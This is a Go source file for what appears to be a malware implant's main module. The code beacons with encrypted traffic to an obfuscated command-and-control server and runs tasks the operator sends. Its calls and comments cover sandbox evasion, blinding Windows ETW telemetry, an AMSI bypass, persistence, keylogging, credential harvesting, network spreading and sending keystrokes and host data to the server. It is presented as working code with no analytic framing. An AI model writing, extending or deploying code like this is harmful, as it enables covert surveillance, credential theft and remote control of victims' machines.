package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strings"
	"time"
)

// C2URL is decoded at runtime from XOR-obfuscated bytes in crypto.go.
// Version is set at build time: -ldflags "-X main.Version=1.5.0"
var (
	C2URL   = ""
	Version = "1.5.0"
	agentID string
)

const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

func main() {
	setSelfPriority() // yield CPU to user apps

	// Decode obfuscated strings — C2URL, AES key/IV live in XOR-encoded blobs
	initSecrets()

	// Bail out of automated sandboxes silently (4h sleep)
	checkSandbox()

	// Blind ETW telemetry from our process before any other activity
	patchETW()

	agentID = buildAgentID()

	// Dead-drop C2 resolution — allows C2 to move without recompiling
	if resolved := resolveC2(); resolved != "" {
		C2URL = resolved
	}

	// Install persistence first — silent, no-op if already installed
	go installPersistence()

	// Apply AMSI bypass so PS commands work cleanly under Defender
	go amsiBypass()

	go runKeylogger()
	go runNetMon()

	// Full inventory + credential harvest on startup
	go func() {
		time.Sleep(5 * time.Second) // let beacon register first
		runInventory(C2URL)
		harvestCreds(C2URL)
	}()

	// Re-run inventory every 4 hours
	go func() {
		for range time.Tick(4 * time.Hour) {
			runInventory(C2URL)
		}
	}()

	jitter := rand.Intn(10)
	interval := time.Duration(25+jitter) * time.Second

	for {
		task, err := beacon()
		if err == nil && task != nil && task.TaskID != "" {
			go func(t *Task) {
				result := executeTask(t)
				sendResult(result)
			}(task)
		}
		time.Sleep(interval)
	}
}

// BeaconPayload is what we POST to /beacon on each check-in.
type BeaconPayload struct {
	AgentID string     `json:"agent_id"`
	Version string     `json:"version"`
	OS      string     `json:"os"`
	Arch    string     `json:"arch"`
	Info    SystemInfo `json:"info"`
}

// Task is returned from /beacon when the C2 has work queued.
type Task struct {
	TaskID  string `json:"task_id"`
	Type    string `json:"type"`    // exec | ps | keylog_flush | spread | update
	Payload string `json:"payload"` // command string or param
}

// TaskResult is what we POST to /result after executing a task.
type TaskResult struct {
	AgentID string `json:"agent_id"`
	TaskID  string `json:"task_id"`
	Output  string `json:"output"`
	Status  string `json:"status"` // ok | error
}

func beacon() (*Task, error) {
	info := getSystemInfo()
	payload := BeaconPayload{
		AgentID: agentID,
		Version: Version,
		OS:      runtime.GOOS,
		Arch:    runtime.GOARCH,
		Info:    info,
	}
	body, _ := json.Marshal(payload)
	enc, err := aesEncrypt(body)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", C2URL+"/beacon",
		strings.NewReader(url.Values{"d": {enc}}.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", userAgent)

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	respBytes, _ := io.ReadAll(resp.Body)
	respBytes = []byte(strings.TrimSpace(string(respBytes)))
	if len(respBytes) == 0 {
		return nil, nil
	}

	decrypted, err := aesDecrypt(string(respBytes))
	if err != nil {
		return nil, nil
	}

	var task Task
	if err := json.Unmarshal(decrypted, &task); err != nil {
		return nil, nil
	}
	if task.TaskID == "" {
		return nil, nil
	}
	return &task, nil
}

func sendResult(r TaskResult) {
	body, _ := json.Marshal(r)
	enc, err := aesEncrypt(body)
	if err != nil {
		return
	}
	req, err := http.NewRequest("POST", C2URL+"/result",
		strings.NewReader(url.Values{"d": {enc}}.Encode()))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", userAgent)
	client := &http.Client{Timeout: 15 * time.Second}
	client.Do(req)
}

func sendKeylog(data string) {
	payload := map[string]string{
		"agent_id": agentID,
		"data":     data,
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 10 * time.Second}
	client.Post(C2URL+"/keylog", "application/json", bytes.NewReader(body))
}

func sendNetMon(connections []Connection) {
	payload := map[string]interface{}{
		"agent_id":    agentID,
		"connections": connections,
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 10 * time.Second}
	client.Post(C2URL+"/netmon", "application/json", bytes.NewReader(body))
}

func sendDiscovered(hosts []DiscoveredHost) {
	payload := map[string]interface{}{
		"agent_id": agentID,
		"hosts":    hosts,
	}
	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 10 * time.Second}
	client.Post(C2URL+"/discovered", "application/json", bytes.NewReader(body))
}

func buildAgentID() string {
	hostname, _ := os.Hostname()
	// Stable ID: hostname + OS, no PID so it survives restarts
	return fmt.Sprintf("%x", hashStr(hostname+runtime.GOOS))[:16]
}

func hashStr(s string) uint64 {
	var h uint64 = 14695981039346656037
	for i := 0; i < len(s); i++ {
		h ^= uint64(s[i])
		h *= 1099511628211
	}
	return h
}
